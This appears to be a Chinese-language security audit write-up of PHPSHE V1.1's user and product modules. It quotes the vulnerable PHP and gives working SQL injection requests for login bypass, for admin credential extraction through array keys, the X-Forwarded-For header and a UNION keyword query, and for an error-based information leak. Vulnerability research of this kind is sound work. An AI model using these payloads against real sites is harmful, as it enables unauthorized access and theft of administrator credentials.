## **PHPSHE V1.1 （三）**

### **user.php**
接下來，我們來看看`user`模塊。

```php
//Line:10

case 'login':
    if (isset($_p_pesubmit)) {
        $_p_info['user_pw'] = md5($_p_info['user_pw']);
        if ($info = $db->pe_select('user', $_p_info)) {
```

亮點在這裡`if ($info = $db->pe_select('user', $_p_info)) {`，只要$info不為空就成功登入了。
<p>
簡單來一發萬能密碼,用戶名：`' or 1=1-- -`，密碼隨意就ok了


### **【Bug 0x09: SQL注入 任意用戶登入】**

URL:

<pre>
/index.php?mod=user&act=login
</pre>

DATA:
<pre>
info%5Buser_name%5D=1' or 1=1-- -
&info%5Buser_pw%5D=123456
&pesubmit=
</pre>

繼續看
```php
//Line:168

case 'base':
    if (isset($_p_pesubmit)) {
        if ($db->pe_update('user', array('user_id'=>$_s_user_id), pe_dbhold($_p_info))) {
            pe_success('基本訊息修改成功！');
        }
        else {
            pe_error('基本訊息修改失敗...');
        }
    }
    $info = $db->pe_select('user', array('user_id'=>$_s_user_id));

    $seo = pe_seo($menutitle='基本訊息');
    include(pe_tpl('user_base.html'));
```

亮點在`if ($db->pe_update('user', array('user_id'=>$_s_user_id), pe_dbhold($_p_info))) {`。
<p>
我們跟進`pe_dbhold()`函數

```php
//Line:30

//資料庫安全
function pe_dbhold($str, $exc=array())
{
    if (is_array($str)) {
        foreach($str as $k => $v) {
            $str[$k] = in_array($k, $exc) ? pe_dbhold($v, 'all') : pe_dbhold($v);
        }
    }
    else {
        $str = $exc == 'all' ? mysql_real_escape_string($str) : mysql_real_escape_string(htmlspecialchars($str));
    }
    return $str;
}
```

此處對陣列的值進行了過濾，但是對陣列的鍵沒有處理。
<br >
我們跟進`pe_update()`函數


```php
public function pe_update($table, $where, $set)
{
    //處理設置語句
    $sqlset = $this->_doset($set);
    //處理條件語句
    $sqlwhere = $this->_dowhere($where);
    return $this->sql_update("update `".dbpre."{$table}` {$sqlset} {$sqlwhere}");    
}
```

### **【Bug 0x06】** 一樣，經過`_dowhere()`處理、一樣可以對其進行注入。

```【Bug 0x09: SQL注入 獲取任意資料庫數據】```
<p>
URL:
<pre>
/index.php?mod=user&act=base
</pre>

<p>
DATA:
<pre>
info%5Buser_address`%3D(select concat(0x7e,admin_name,0x7e,admin_pw,0x7e) from pe_admin limit 1) , `user_tname%5D=1
</pre>


**product.php**
<p>
第一個操作**商品諮詢**就可能存在一個小BUG。

```php
//Line:5

case 'askadd':
    if (isset($_p_pesubmit)) {
        ...
        $info['ask_text'] = pe_texthtml(pe_dbhold($_p_ask_text));
        ...
        $info['user_ip'] = pe_ip();
        if ($db->pe_insert('ask', $info)) {
            ...
            $info['ask_text'] = htmlspecialchars($_p_ask_text);
```


## **【Bug 0x10: 訊息洩漏 Warning】**
POST:
<p>
<pre>/index.php?mod=product&act=askadd&id=1</pre>
<br>
DATA:
<p>
<pre>ask_text[]=asfasdfasfs&pesubmit=true</pre>
<br>

錯誤訊息
<pre>
Warning: nl2br() expects parameter 1 to be string, array given in E:\SourceCodes\phpshe1.1\include\function\global.func.php
Warning: htmlspecialchars() expects parameter 1 to be string, array given in E:\SourceCodes\phpshe1.1\module\index\product.php
</pre>

然後還有一個亮點`$info['user_ip'] = pe_ip();`，我們跟進`pe_ip()`函數

```php
//Line : 333

//獲取IP
function pe_ip()
{
    if (isset($_SERVER)){
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
            $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    ...
    return $realip;
```

明顯的XFF注入。只要在寫入資料庫的時候用到了這個函數獲取IP的地方、、都是一樣的注入。

### **【Bug 0x11: SQL注入 獲取任意資料庫數據】**
POST:
<br>
<pre>/index.php?mod=product&act=askadd&id=1</pre>
<p>
x-forwarded-for:
<pre>
1', `ask_replytext` = (select concat(0x7e,admin_name,0x7e,admin_pw,0x7e)  from pe_admin limit 1)#
</pre>
返回的訊息在商品、賣家回覆裡。
<br >
再往下看，在 **商品列表** 操作中、又是一個大大的BUG出現了。

```php
//Line:83

case 'list':
    ...
    $_g_keyword && $sqlwhere .= " and `product_name` like '%{$_g_keyword}%'";
    ...
    $info_list = $db->pe_selectall('product', $sqlwhere, '*', array(16, $_g_page));
```

WHERE條件帶入了未經過濾的`$_g_keyword`變數。
<br>
### **【Bug 0x12: SQL注入 獲取任意資料庫數據】**
URL:
```php
/index.php?mod=product&act=list&id=1&keyword=%' union select 1,admin_pw,1,1,1,admin_name,1,1,1,1,1,1,1,1,1,1,1,1,1 from pe_admin-- -
```